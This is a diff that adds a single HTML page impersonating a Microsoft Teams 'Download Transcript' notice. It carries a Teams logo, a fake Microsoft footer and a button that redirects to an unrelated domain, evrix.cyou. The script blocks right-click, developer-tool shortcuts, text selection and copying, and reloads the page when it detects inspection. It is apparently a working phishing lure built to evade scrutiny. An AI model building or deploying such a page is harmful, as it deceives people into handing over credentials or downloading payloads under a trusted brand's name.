@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url(https://eu-images.contentstack.com/v3/assets/blt07f68461ccd75245/blt0b110406f6eb9f1f/661812b9a9bac62a2427ee5e/savechatsmsteamshero_0_2.png?width=1280&auto=webp&quality=95&format=jpg&disable=upscale);
+            background-size: cover;
+            filter: blur(4px);
+            z-index: -1;
+        }
+
+        .notification {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .btn {
+            background: #6264A7;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center; 
+            gap: 8px;
+            transition: background 0.3s ease;
+            margin: 0 auto; 
+            min-width: 200px; 
+        }
+        .notification {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .btn:hover {
+            background: #3c3d47;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .logo-container {
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .logo-container img {
+            max-width: 120px;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 1rem;
+            background: #cec9c9;
+            text-align: center;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 10px 10px 0 0;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .footer p {
+            margin: 0.5rem 0;
+            color: #666;
+        }
+
+        .footer a {
+            color: #6264A7;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #4a4c7e;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="notification">
+       
+        <div class="logo-container">
+        <img src="https://i.ibb.co/nsXbrbVB/Microsoft-Teams-Logo-1.png"
+        </div>
+        
+        <p>Click here to Download Transcript</p>
+        <button class="btn" onclick="redirect()">
+            <div class="spinner" style="display: none;"></div>
+            Download Transcript
+        </button>
+    </div>
+    <div class="footer">
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Support</a></p>
+        <p>&copy; 2025 Microsoft Teams</p>
+    </div>
+
+
+    <script>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    
+        let devToolsOpened = false;
+        const devToolsChecker = new Image();
+        Object.defineProperty(devToolsChecker, 'id', {
+            get: function() {
+                devToolsOpened = true;
+                document.body.innerHTML = '<h1>Inspection not allowed</h1>';
+                window.location.reload();
+            }
+        });
+    
+        setInterval(function() {
+            devToolsOpened = false;
+            console.log(devToolsChecker);
+            if (devToolsOpened) {
+                document.body.innerHTML = '<h1>Inspection detected</h1>';
+                window.location.reload();
+            }
+        }, 1000);
+    
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    
+        document.addEventListener('copy cut paste', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    
+        function redirect() {
+            const btn = document.querySelector('.btn');
+            const spinner = document.querySelector('.spinner');
+            
+            spinner.style.display = 'block';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                window.location.href = 'https://evrix.cyou/msteams';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
